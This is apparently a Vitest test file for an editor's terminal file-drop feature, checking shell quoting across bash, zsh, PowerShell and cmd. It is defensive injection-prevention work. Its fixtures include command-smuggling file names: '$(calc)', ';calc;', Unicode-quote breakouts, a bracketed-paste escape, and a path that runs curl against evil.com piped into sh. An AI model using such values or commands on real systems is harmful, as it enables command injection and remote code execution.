import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { commands } from "@/platform/ipc";
import { usePlatform } from "@/platform/platformInfo";
import { isRemoteWindow } from "@/platform/remote";
import { handleFileDrop } from "@/workbench/fileDrop";
import { dragSession, FILES_DRAG } from "@/ui";
import { droppedPathsText, installTerminalDrop } from "./drop";

const notify = vi.hoisted(() => vi.fn());
vi.mock("@/platform/remote", () => ({ isRemoteWindow: vi.fn(() => false) }));
vi.mock("@/workbench/contributions", async (importOriginal) => ({
  ...(await importOriginal<typeof import("@/workbench/contributions")>()),
  notifications: () => ({ notify }),
}));

const initialOs = usePlatform.getState().os;
const originalElementFromPoint = document.elementFromPoint;

beforeEach(() => {
  vi.stubGlobal("__TAURI_INTERNALS__", {});
  usePlatform.setState({ os: "macos" });
  notify.mockClear();
});

afterEach(() => {
  document.body.replaceChildren();
  document.elementFromPoint = originalElementFromPoint;
  usePlatform.setState({ os: initialOs });
  vi.restoreAllMocks();
  vi.unstubAllGlobals();
  vi.mocked(isRemoteWindow).mockReturnValue(false);
});

describe("terminal drop", () => {
  it.each(["macos", "linux"])("quotes POSIX paths and joins files with spaces on %s", (os) => {
    usePlatform.setState({ os });
    expect(droppedPathsText(["/plain/file.ts"])).toBe("/plain/file.ts");
    expect(droppedPathsText(["/a b/c.png", "/plain", "C:/dir/e f"])).toBe("'/a b/c.png' /plain 'C:/dir/e f'");
    expect(droppedPathsText(["/it's here"])).toBe("'/it'\\''s here'");
  });

  it("uses double quotes for Windows paths with spaces or shell metacharacters", () => {
    usePlatform.setState({ os: "windows" });
    expect(droppedPathsText(["C:\\plain\\file.ts", "C:\\a b\\c.png", "C:\\it's here\\"])).toBe(
      'C:\\plain\\file.ts "C:\\a b\\c.png" "C:\\it\'s here\\"',
    );
    expect(droppedPathsText(["C:\\a&b\\c.png"])).toBe('"C:\\a&b\\c.png"');
  });

  it("quotes a dropped path for the shell that reads it, not for the operating system", () => {
    usePlatform.setState({ os: "windows" });
    expect(droppedPathsText(["C:\\Users\\a$(calc).txt"], "pwsh")).toBe("'C:\\Users\\a$(calc).txt'");
    expect(droppedPathsText(["C:\\Users\\a;calc;.txt"], "powershell")).toBe("'C:\\Users\\a;calc;.txt'");
    expect(droppedPathsText(["C:\\Users\\a\u2019; calc; \u2018b.txt"], "pwsh")).toBe(
      "'C:\\Users\\a\u2019\u2019; calc; \u2018\u2018b.txt'",
    );
    expect(droppedPathsText(["C:\\Users\\plain.txt", "C:\\Users\\a b.txt"], "pwsh")).toBe(
      "C:\\Users\\plain.txt 'C:\\Users\\a b.txt'",
    );
    expect(droppedPathsText(["C:\\Users\\a&b.txt"], "cmd")).toBe('"C:\\Users\\a&b.txt"');
    expect(() => droppedPathsText(["C:\\Users\\100%.txt"], "cmd")).toThrow(/cmd\.exe/);
    expect(droppedPathsText(["/home/u/;{curl,evil.com}|sh;.txt"], "bash")).toBe("'/home/u/;{curl,evil.com}|sh;.txt'");
  });

  it.each(["macos", "linux"])("quotes POSIX metacharacters that a bare path would leave to the shell on %s", (os) => {
    usePlatform.setState({ os });
    expect(droppedPathsText(["/tmp/a;b"])).toBe("'/tmp/a;b'");
    expect(droppedPathsText(["/tmp/a*b?[c]"])).toBe("'/tmp/a*b?[c]'");
    expect(droppedPathsText(["/tmp/{a,b}", "/tmp/a|b", "/tmp/a&b", "/tmp/a(b)", "/tmp/a<b>"])).toBe(
      "'/tmp/{a,b}' '/tmp/a|b' '/tmp/a&b' '/tmp/a(b)' '/tmp/a<b>'",
    );
  });

  it("refuses a dropped path that has control characters", () => {
    expect(() => droppedPathsText(["/tmp/a\nb"])).toThrow(/control characters/);
    expect(() => droppedPathsText(["/tmp/a\x1b[201~b"], "zsh")).toThrow(/control characters/);
  });

  it("quotes for the shell of the terminal under the cursor", async () => {
    usePlatform.setState({ os: "windows" });
    const host = document.createElement("div");
    const child = document.createElement("span");
    host.append(child);
    document.body.replaceChildren(host);
    document.elementFromPoint = (() => child) as typeof document.elementFromPoint;
    const paste = vi.fn();
    const remove = installTerminalDrop(host, paste, () => ({ shell: "pwsh" }));
    try {
      await handleFileDrop(["C:\\Users\\a$(calc).txt"], 1, 1);
      expect(paste.mock.calls).toEqual([["'C:\\Users\\a$(calc).txt'"]]);
    } finally {
      remove();
    }
  });

  it("tells the user instead of pasting a path it cannot quote safely", async () => {
    const host = document.createElement("div");
    const child = document.createElement("span");
    host.append(child);
    document.body.replaceChildren(host);
    document.elementFromPoint = (() => child) as typeof document.elementFromPoint;
    const paste = vi.fn();
    const remove = installTerminalDrop(host, paste, () => ({ shell: "zsh" }));
    try {
      const handled = handleFileDrop(["/tmp/a\nb"], 1, 1);
      expect(handled).not.toBeNull();
      await handled;
      expect(paste).not.toHaveBeenCalled();
      expect(notify).toHaveBeenCalledWith({
        level: "error",
        title: "Cannot paste the dropped files",
        body: "Cannot paste this path safely: its name contains control characters.",
      });
    } finally {
      remove();
    }
  });

  it("pastes only into the host under the cursor without executing, regardless of registration order", async () => {
    const list = vi.spyOn(commands, "clipboardFileList");
    const hosts = [document.createElement("div"), document.createElement("div")];
    const targets = hosts.map((host, i) => {
      host.dataset.terminalSession = `s${i}`;
      const child = document.createElement("span");
      host.append(child);
      return child;
    });
    const elsewhere = document.createElement("div");
    document.body.replaceChildren(...hosts, elsewhere);
    document.elementFromPoint = ((x: number) => targets[x] ?? elsewhere) as typeof document.elementFromPoint;
    const pasted = [vi.fn(), vi.fn()] as const;
    const remove = hosts.map((host, i) => installTerminalDrop(host, pasted[i]!));
    try {
      await handleFileDrop(["/a b", "/plain"], 1, 1);
      expect(pasted[0]).not.toHaveBeenCalled();
      expect(pasted[1].mock.calls).toEqual([["'/a b' /plain"]]);
      await handleFileDrop(["/first"], 0, 1);
      expect(pasted[0].mock.calls).toEqual([["/first"]]);
      await handleFileDrop([], 1, 1);
      await handleFileDrop(["/img/pic.png"], 9, 9);
      expect(pasted[1]).toHaveBeenCalledOnce();
      expect(list).not.toHaveBeenCalled();
      remove.forEach((dispose) => dispose());
      await handleFileDrop(["/late"], 1, 1);
      expect(pasted[1]).toHaveBeenCalledOnce();
    } finally {
      remove.forEach((dispose) => dispose());
    }
  });

  it("ignores detached and hidden sessions when dropping on an embedded Run console", async () => {
    const detached = document.createElement("div");
    detached.dataset.terminalSession = "detached";
    const hidden = document.createElement("div");
    hidden.dataset.terminalSession = "hidden";
    hidden.hidden = true;
    const runHost = document.createElement("div");
    const child = document.createElement("span");
    runHost.append(child);
    document.body.replaceChildren(hidden, runHost);
    document.elementFromPoint = () => child;
    const pasted = [vi.fn(), vi.fn(), vi.fn()] as const;
    const remove = [detached, hidden, runHost].map((host, i) => installTerminalDrop(host, pasted[i]!));
    try {
      await handleFileDrop(["/run input"], 1, 1);
      expect(pasted[0]).not.toHaveBeenCalled();
      expect(pasted[1]).not.toHaveBeenCalled();
      expect(pasted[2].mock.calls).toEqual([["'/run input'"]]);
    } finally {
      remove.forEach((dispose) => dispose());
    }
  });

  it("leaves local path drops unhandled in a remote window", () => {
    const host = document.createElement("div");
    document.body.append(host);
    document.elementFromPoint = () => host;
    const paste = vi.fn();
    const remove = installTerminalDrop(host, paste);
    try {
      vi.mocked(isRemoteWindow).mockReturnValue(true);
      expect(handleFileDrop(["/local/file"], 1, 1)).toBeNull();
      expect(paste).not.toHaveBeenCalled();
    } finally {
      remove();
    }
  });

  it("pastes paths dragged from the Project view, also in a remote window", () => {
    vi.mocked(isRemoteWindow).mockReturnValue(true);
    const host = document.createElement("div");
    const child = document.createElement("span");
    host.append(child);
    document.body.replaceChildren(host);
    document.elementFromPoint = (() => child) as typeof document.elementFromPoint;
    const paste = vi.fn();
    const remove = installTerminalDrop(host, paste);
    try {
      const drag = dragSession({ type: FILES_DRAG, payload: "/p/src/a b.ts\n/p/docs/" });
      expect(drag.move(1, 1)).toBe(true);
      expect(drag.drop(1, 1)).toBe(true);
      expect(paste.mock.calls).toEqual([["'/p/src/a b.ts' /p/docs"]]);
    } finally {
      remove();
    }
  });
});
